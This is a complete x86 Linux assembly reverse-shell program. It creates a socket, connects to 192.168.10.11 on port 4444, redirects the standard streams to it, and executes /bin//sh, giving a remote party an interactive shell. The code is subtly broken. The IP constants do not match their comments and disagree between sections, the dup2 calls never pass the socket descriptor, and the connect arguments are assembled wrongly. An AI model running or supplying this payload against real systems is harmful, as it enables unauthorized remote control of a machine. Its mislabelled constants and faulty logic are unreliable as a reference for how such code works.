section .text
    global _start

_start:
    ; Create socket
    xor eax, eax                ; Clear EAX
    mov al, 0x66                ; Socket syscall number (sys_socketcall)
    xor ebx, ebx                ; Clear EBX
    inc ebx                     ; EBX = 1 (socketcall: SYS_SOCKET)
    xor ecx, ecx                ; Clear ECX
    mov cl, 0x2                 ; Protocol = IPPROTO_IP (IP protocol)
    xor edx, edx                ; Clear EDX
    push edx                    ; Clear EDX (padding)
    push ecx                    ; Push IPPROTO_IP (2) onto stack
    push ebx                    ; Push SYS_SOCKET (1) onto stack
    mov ecx, esp                ; Set ECX to point to syscall arguments
    int 0x80                    ; Call syscall

    ; Connect to server
    mov edi, eax                ; Save socket file descriptor
    xor eax, eax                ; Clear EAX
    mov al, 0x66                ; Socket syscall number (sys_socketcall)
    xor ebx, ebx                ; Clear EBX
    mov bl, 0x3                 ; SYS_CONNECT
    mov ecx, esp                ; Set ECX to point to syscall arguments
    xor edx, edx                ; Clear EDX
    mov dx, 0x5c11              ; Port number in little-endian format (4444)
    push edx                    ; Push port number onto stack
    mov edx, 0x0a0a8c0b         ; IP address in little-endian format (192.168.10.11)
    push edx                    ; Push IP address onto stack
    push word 0x2               ; AF_INET (2)
    mov ecx, esp                ; Set ECX to point to sockaddr structure
    int 0x80                    ; Call syscall

    ; Redirect stdin, stdout, and stderr to socket
    xor eax, eax                ; Clear EAX
    xor ebx, ebx                ; Clear EBX
    xor ecx, ecx                ; Clear ECX
    mov al, 0x3f                ; SYS_DUP2
    mov bl, 0x2                 ; FD 2 (stderr)
    int 0x80                    ; Call syscall
    mov al, 0x3f                ; SYS_DUP2
    mov bl, 0x1                 ; FD 1 (stdout)
    int 0x80                    ; Call syscall
    mov al, 0x3f                ; SYS_DUP2
    mov bl, 0x0                 ; FD 0 (stdin)
    int 0x80                    ; Call syscall

    ; Execute shell
    xor eax, eax                ; Clear EAX
    mov al, 0x0b                ; execve syscall number
    xor ebx, ebx                ; Clear EBX
    push ebx                    ; Push null terminator for argv
    push dword 0x68732f2f       ; Push "hs//" in little-endian format (//sh)
    push dword 0x6e69622f       ; Push "nib/" in little-endian format (/bin)
    mov ebx, esp                ; Set EBX to point to command string
    xor ecx, ecx                ; Clear ECX
    mov edx, ecx                ; Clear EDX
    int 0x80                    ; Call execve syscall

section .data
    ; IP address and port in little-endian format
    ip_addr     db 0x0b, 0x0a, 0x8c, 0x0a  ; 192.168.10.11
    port        dw 0x5c11                  ; Port 4444
